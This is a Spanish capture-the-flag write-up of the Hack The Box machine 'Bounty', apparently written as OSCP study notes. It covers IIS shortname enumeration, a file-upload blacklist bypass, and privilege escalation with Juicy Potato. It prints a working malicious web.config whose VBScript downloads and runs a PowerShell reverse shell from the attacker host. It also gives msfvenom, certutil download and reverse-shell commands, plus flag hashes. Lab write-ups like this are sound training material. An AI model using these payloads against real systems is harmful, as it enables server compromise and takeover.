---
tags:
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/142
dificultad: Fácil
ip: 10.10.10.93
os: Windows
linked:
  - "[[IIS Enumeration]]"
  - "[[IIS Exploitation]]"
  - "[[Abuso de SeImpersonatePrivilege (Ataques \"Potato\")]]"
  - "[[Bypass de Subida de Archivos]]"
  - "[[Remote Code Execution|RCE]]"
---
# HackTheBox - Bounty

## Reconocimiento

Mi proceso comenzó con una fase de reconocimiento para identificar los servicios activos en la máquina objetivo.

### Escaneo de Puertos con Nmap

Para obtener una visión completa y rápida de los puertos abiertos, primero utilicé `masscan` para un escaneo rápido de todos los 65,535 puertos TCP. Luego, pasé los puertos descubiertos a `nmap` para un análisis más detallado, incluyendo la detección de servicios y la ejecución de scripts básicos de enumeración.
```Bash
# Escaneo rápido para encontrar puertos abiertos
masscan -p1-65535 10.10.10.93 --rate=1000 -e tun0 > allports

# Extraer y formatear la lista de puertos para nmap
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn --defeat-rst-ratelimit $(cat ip) -oG 01_Reconnaissance/tcpports

# Escaneo detallado con nmap sobre los puertos descubiertos
nmap -sCV -p80 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

El resultado principal fue un servidor web **Microsoft IIS** corriendo en el puerto 80. Al visitar la página principal, solo encontré una imagen estática sin funcionalidades aparentes, lo que me llevó a realizar una enumeración más profunda de archivos y directorios.

### Enumeración de Nombres Cortos (Shortnames) en IIS

Antes de lanzar un ataque de fuerza bruta de directorios, decidí verificar si el servidor era vulnerable a la enumeración de nombres cortos de IIS (tilde `~`). Esta vulnerabilidad es un remanente de los antiguos nombres de archivo 8.3 de DOS y permite a un atacante, mediante el envío de peticiones `GET` u `OPTIONS` con caracteres especiales, deducir los primeros caracteres de nombres de archivos y directorios que de otro modo estarían ocultos.

Utilicé la herramienta `iis_shortname_scanner` para automatizar esta prueba.
```Bash
java -jar /opt/IIS-ShortName-Scanner/iis_shortname_scanner.jar 2 20 http://10.10.10.93 /opt/IIS-ShortName-Scanner/config.xml
```

El escáner confirmó que el servidor era vulnerable y reveló la existencia de un directorio que comenzaba con "**upload**" y un archivo que comenzaba con "**transf**".

### Descubrimiento de Directorios y Archivos

Con las pistas obtenidas del escaneo de nombres cortos, pude acotar significativamente mi lista de palabras para un ataque de fuerza bruta con `dirsearch`. Esto me permitió encontrar rápidamente los recursos exactos:

- El directorio `/uploadedfiles/`
- El archivo `/transfer.aspx`


---

## Análisis de vulnerabilidades

El hallazgo de una página `transfer.aspx` y un directorio `uploadedfiles` sugería una funcionalidad de subida de archivos. Mi siguiente paso fue analizar cómo podía abusar de esta característica.

### Bypass de Restricciones en la Subida de Archivos

Al interactuar con `transfer.aspx`, confirmé que permitía subir archivos. Mi primer intento fue subir un webshell estándar en formato `.aspx`, pero el servidor lo rechazó. Esto indicaba la presencia de un filtro de seguridad que probablemente operaba mediante una **lista negra de extensiones de archivo**.

Para identificar qué extensiones _sí_ estaban permitidas, decidí realizar un fuzzing. Capturé una petición de subida de archivo válida con **Burp Suite** y la envié a la herramienta **Intruder**. Utilicé una lista de extensiones comunes en entornos IIS/ASP para probar sistemáticamente cuál podría evadir el filtro.

> [!note] El descubrimiento clave fue que los archivos con la extensión `.config` se subían correctamente, a diferencia de otros. Esto lo noté por la diferencia en la longitud de la respuesta del servidor, que indicaba que el archivo había sido aceptado y guardado.


---

## Explotación de vulnerabilidades

Sabiendo que podía subir archivos `.config`, mi objetivo era transformar esta capacidad en ejecución de código remoto (RCE).

### Creación y Subida de un Payload en web.config

Los archivos `web.config` son archivos de configuración XML para aplicaciones web en IIS. Una técnica conocida, investigada por Soroush Dalili, permite incrustar código ASP ejecutable dentro de un archivo `web.config`. Si se configura correctamente, es posible hacer que IIS interprete y ejecute este archivo como si fuera un script.

Creé un archivo `web.config` malicioso con dos componentes clave:

1. **Manipulación de Handlers**: Modifiqué la sección `<handlers>` para indicarle a IIS que procesara cualquier archivo con la extensión `.config` utilizando el motor de ASP (`asp.dll`).
    
2. **Payload VBScript**: Incrusté un bloque de código VBScript (`<% ... %>`) que utilizaría `WScript.Shell` para ejecutar un comando de PowerShell. Este comando descargaría y ejecutaría un script de reverse shell (`shell.ps1`) alojado en mi máquina de atacante.
    
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
   </appSettings>
</configuration>
<%
Set objShell = CreateObject("WScript.Shell")
strCommand = "cmd /c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.17/shell.ps1')"
Set objShellExec = objShell.Exec(strCommand)
strOutput = objShellExec.StdOut.ReadAll()
WScript.StdOut.Write(strOutput)
WScript.Echo(strOutput)
%>
```

### Obtención de Acceso Inicial

Subí mi `web.config` modificado a través de `transfer.aspx`. El servidor lo guardó en el directorio `/uploadedfiles/`. Para activar el payload, simplemente tuve que navegar a la URL del archivo subido: `http://10.10.10.93/uploadedfiles/web.config`.

Al hacerlo, IIS ejecutó el código VBScript incrustado, lo que a su vez lanzó mi reverse shell de PowerShell. Recibí una conexión en mi listener, obteniendo acceso inicial al sistema como el usuario del pool de aplicaciones de IIS.


---

## Escalada de privilegios

Una vez dentro del sistema, mi siguiente paso fue investigar las posibles vías para escalar privilegios.

### Análisis del Sistema y Privilegios del Usuario

Comencé ejecutando `systeminfo` y `whoami /priv` para obtener un panorama claro del sistema y de los privilegios asignados a mi usuario actual.

```powershell
# Información del sistema
systeminfo

# Privilegios del usuario actual
whoami /priv
```

La salida de estos comandos reveló dos puntos críticos:

> [!warning]
> 
> El servidor era un Microsoft Windows Server 2008 R2 sin ningún Hotfix instalado. Esto significaba que, además de cualquier otra técnica, el sistema era un candidato perfecto para una gran variedad de exploits de kernel públicos.

> [!info]
> 
> Mi usuario tenía habilitado el privilegio SeImpersonatePrivilege. Este privilegio es comúnmente asignado a cuentas de servicio (como las que ejecutan IIS) y permite a un proceso suplantar el token de seguridad de otro usuario, lo cual es una vía clásica para la escalada de privilegios.

### Explotando SeImpersonatePrivilege con Juicy Potato

Dado que contaba con `SeImpersonatePrivilege`, decidí utilizar la herramienta [JuicyPotato](https://github.com/ohpe/juicy-potato/releases/tag/v0.1). Este exploit abusa de la forma en que Microsoft maneja los tokens de seguridad para secuestrar el de un servicio con altos privilegios (como `SYSTEM`) y ejecutar un comando de nuestra elección.

#### 1. Preparación del Payload

Primero, generé un payload de reverse shell utilizando `msfvenom` para obtener una shell como `SYSTEM`.
```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f exe -o reverse.exe
```

#### 2. Transferencia de Herramientas

A continuación, transferí tanto `JuicyPotato.exe` como mi payload `reverse.exe` a la máquina víctima. Creé un directorio `C:\temp` en el objetivo y utilicé `certutil` para descargar los archivos desde un servidor web que monté en mi máquina.
```PowerShell
# En la máquina víctima
mkdir C:\temp
cd C:\temp
certutil -urlcache -split -f http://10.10.14.17/JuicyPotato.exe jp.exe
certutil -urlcache -split -f http://10.10.14.17/reverse.exe reverse.exe
```

#### 3. Ejecución y Obtención de SYSTEM

Con todo en su lugar, puse un listener (`netcat`) a la escucha en el puerto 443 en mi máquina. Finalmente, ejecuté Juicy Potato en la máquina víctima, indicándole que lanzara mi payload.
```PowerShell
# En la máquina víctima
C:\temp\jp.exe -t * -p C:\temp\reverse.exe -l 443
```

El exploit se ejecutó con éxito. Juicy Potato abusó del privilegio `SeImpersonatePrivilege`, forzó la ejecución de `reverse.exe` con los permisos más elevados y recibí una conexión inversa en mi listener. Ya soy `nt authority\system`


---

## Bandera(s)

> [!flag] `flag{user}`
> 65219c58e67601f857c5a503b499cfc3
^bandera-user

> [!flag] `flag{root}`
> caac7493fa4d172e5e407f31146015a4
^bandera-root
